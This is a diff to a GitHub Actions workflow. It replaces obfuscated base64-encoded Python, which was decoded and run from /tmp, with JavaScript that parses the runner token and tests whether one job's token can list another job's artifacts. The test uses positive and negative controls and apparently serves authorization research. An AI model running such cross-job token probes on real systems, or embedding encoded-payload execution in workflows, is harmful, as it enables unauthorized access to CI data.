@@ -8,12 +8,57 @@ jobs:
       jobid: ${{ steps.ids.outputs.jobid }}
     steps:
       - id: ids
-        run: echo aW1wb3J0IG9zLCBiYXNlNjQsIGpzb24KdCA9IG9zLmVudmlyb25bIkFDVElPTlNfUlVOVElNRV9UT0tFTiJdCnAgPSB0LnNwbGl0KCIuIilbMV07IHAgKz0gIj0iICogKCg0IC0gbGVuKHApICUgNCkgJSA0KQpjID0ganNvbi5sb2FkcyhiYXNlNjQudXJsc2FmZV9iNjRkZWNvZGUocCkpCnNjcCA9IGMuZ2V0KCJzY3AiLCAiIikKcGxhbiA9IGpvYiA9ICIiCmZvciBwYXJ0IGluIHNjcC5zcGxpdCgpOgogICAgaWYgcGFydC5zdGFydHN3aXRoKCJBY3Rpb25zLlJlc3VsdHM6Iik6CiAgICAgICAgXywgcGxhbiwgam9iID0gcGFydC5zcGxpdCgiOiIpCnByaW50KCJKT0JCX1NDUCIsIHNjcCkKcHJpbnQoIkpPQkJfUkVTVUxUU19VUkwiLCBvcy5lbnZpcm9uLmdldCgiQUNUSU9OU19SRVNVTFRTX1VSTCIpKQp3aXRoIG9wZW4ob3MuZW52aXJvblsiR0lUSFVCX09VVFBVVCJdLCAiYSIpIGFzIGY6CiAgICBmLndyaXRlKCJwbGFuaWQ9JXNcbmpvYmlkPSVzXG4iICUgKHBsYW4sIGpvYikpCg== | base64 -d > /tmp/b.py && python3 /tmp/b.py
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const t = process.env.ACTIONS_RUNTIME_TOKEN;
+            console.log("JOBB token present:", !!t, "len", t ? t.length : 0);
+            console.log("JOBB ACTIONS_RESULTS_URL:", process.env.ACTIONS_RESULTS_URL);
+            const c = JSON.parse(Buffer.from(t.split(".")[1], "base64url").toString());
+            const scp = c.scp || "";
+            console.log("JOBB scp:", scp);
+            let plan = "", job = "";
+            for (const p of scp.split(" ")) {
+              if (p.startsWith("Actions.Results:")) { const a = p.split(":"); plan = a[1]; job = a[2]; }
+            }
+            console.log("JOBB plan:", plan, "job:", job);
+            core.setOutput("planid", plan);
+            core.setOutput("jobid", job);
   joba:
     needs: jobb
     runs-on: ubuntu-latest
     steps:
-      - env:
+      - uses: actions/github-script@v7
+        env:
           B_PLAN: ${{ needs.jobb.outputs.planid }}
           B_JOB: ${{ needs.jobb.outputs.jobid }}
-        run: echo aW1wb3J0IG9zLCBiYXNlNjQsIGpzb24sIHVybGxpYi5yZXF1ZXN0LCB1cmxsaWIuZXJyb3IKdCA9IG9zLmVudmlyb25bIkFDVElPTlNfUlVOVElNRV9UT0tFTiJdCnAgPSB0LnNwbGl0KCIuIilbMV07IHAgKz0gIj0iICogKCg0IC0gbGVuKHApICUgNCkgJSA0KQpjID0ganNvbi5sb2FkcyhiYXNlNjQudXJsc2FmZV9iNjRkZWNvZGUocCkpCnBsYW4gPSBqb2IgPSAiIgpmb3IgcGFydCBpbiBjLmdldCgic2NwIiwgIiIpLnNwbGl0KCk6CiAgICBpZiBwYXJ0LnN0YXJ0c3dpdGgoIkFjdGlvbnMuUmVzdWx0czoiKToKICAgICAgICBfLCBwbGFuLCBqb2IgPSBwYXJ0LnNwbGl0KCI6IikKYnBsYW4gPSBvcy5lbnZpcm9uWyJCX1BMQU4iXTsgYmpvYiA9IG9zLmVudmlyb25bIkJfSk9CIl0KcHJpbnQoIkpPQkEgcGxhbj0lcyBqb2I9JXMiICUgKHBsYW4sIGpvYikpCnByaW50KCJKT0JCIHBsYW49JXMgam9iPSVzIiAlIChicGxhbiwgYmpvYikpCnByaW50KCJTQU1FX1BMQU49JXMgRElGRkVSRU5UX0pPQj0lcyIgJSAocGxhbiA9PSBicGxhbiwgam9iICE9IGJqb2IpKQpiYXNlID0gb3MuZW52aXJvblsiQUNUSU9OU19SRVNVTFRTX1VSTCJdLnJzdHJpcCgiLyIpCnVybCA9IGJhc2UgKyAiL3R3aXJwL2dpdGh1Yi5hY3Rpb25zLnJlc3VsdHMuYXBpLnYxLkFydGlmYWN0U2VydmljZS9MaXN0QXJ0aWZhY3RzIgpkZWYgY2FsbChsYWJlbCwgcmlkLCBqaWQpOgogICAgYm9keSA9IGpzb24uZHVtcHMoeyJ3b3JrZmxvd19ydW5fYmFja2VuZF9pZCI6IHJpZCwgIndvcmtmbG93X2pvYl9ydW5fYmFja2VuZF9pZCI6IGppZH0pLmVuY29kZSgpCiAgICByID0gdXJsbGliLnJlcXVlc3QuUmVxdWVzdCh1cmwsIGRhdGE9Ym9keSwgbWV0aG9kPSJQT1NUIiwKICAgICAgICBoZWFkZXJzPXsiQXV0aG9yaXphdGlvbiI6ICJCZWFyZXIgIiArIHQsICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiJ9KQogICAgdHJ5OgogICAgICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3BlbihyLCB0aW1lb3V0PTIwKSBhcyBmOgogICAgICAgICAgICBwcmludCgiQVJNICUtMzJzIEhUVFAgJXMgJXMiICUgKGxhYmVsLCBmLnN0YXR1cywgZi5yZWFkKClbOjE4MF0uZGVjb2RlKGVycm9ycz0icmVwbGFjZSIpKSkKICAgIGV4Y2VwdCB1cmxsaWIuZXJyb3IuSFRUUEVycm9yIGFzIGU6CiAgICAgICAgcHJpbnQoIkFSTSAlLTMycyBIVFRQICVzICVzIiAlIChsYWJlbCwgZS5jb2RlLCBlLnJlYWQoKVs6MTgwXS5kZWNvZGUoZXJyb3JzPSJyZXBsYWNlIikpKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KCJBUk0gJS0zMnMgRVhDICVzIiAlIChsYWJlbCwgZSkpCnByaW50KCJBUk1TX0JFR0lOIikKY2FsbCgiMV9QT1NJVElWRV9DT05UUk9MX293bl9qb2IiLCBwbGFuLCBqb2IpCmNhbGwoIjJfQ1JPU1NKT0Jfc2FtZV9ydW5fam9iQiIsIHBsYW4sIGJqb2IpCmNhbGwoIjNfTkVHX0NPTlRST0xfYm9ndXNfam9iaWQiLCBwbGFuLCAiMDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAwIikKcHJpbnQoIkFSTVNfRU5EIikK | base64 -d > /tmp/a.py && python3 /tmp/a.py
+        with:
+          script: |
+            const t = process.env.ACTIONS_RUNTIME_TOKEN;
+            const base = (process.env.ACTIONS_RESULTS_URL || "").replace(/\/$/, "");
+            const c = JSON.parse(Buffer.from(t.split(".")[1], "base64url").toString());
+            let plan = "", job = "";
+            for (const p of (c.scp || "").split(" ")) {
+              if (p.startsWith("Actions.Results:")) { const a = p.split(":"); plan = a[1]; job = a[2]; }
+            }
+            const bplan = process.env.B_PLAN, bjob = process.env.B_JOB;
+            console.log("JOBA plan:", plan, "job:", job);
+            console.log("JOBB plan:", bplan, "job:", bjob);
+            console.log("SAME_PLAN:", plan === bplan, " DIFFERENT_JOB:", job !== bjob);
+            console.log("RESULTS_URL:", base);
+            const url = base + "/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts";
+            async function call(label, rid, jid) {
+              const body = JSON.stringify({ workflow_run_backend_id: rid, workflow_job_run_backend_id: jid });
+              try {
+                const r = await fetch(url, { method: "POST",
+                  headers: { "Authorization": "Bearer " + t, "Content-Type": "application/json" },
+                  body });
+                const txt = (await r.text()).slice(0, 240);
+                console.log("ARM " + label + " HTTP " + r.status + " :: " + txt);
+              } catch (e) { console.log("ARM " + label + " EXC " + e.message); }
+            }
+            console.log("ARMS_BEGIN");
+            await call("1_POSITIVE_CONTROL_own_job     ", plan, job);
+            await call("2_CROSSJOB_same_run_jobB       ", plan, bjob);
+            await call("3_NEG_CONTROL_bogus_jobid      ", plan, "00000000-0000-0000-0000-000000000000");
+            console.log("ARMS_END");
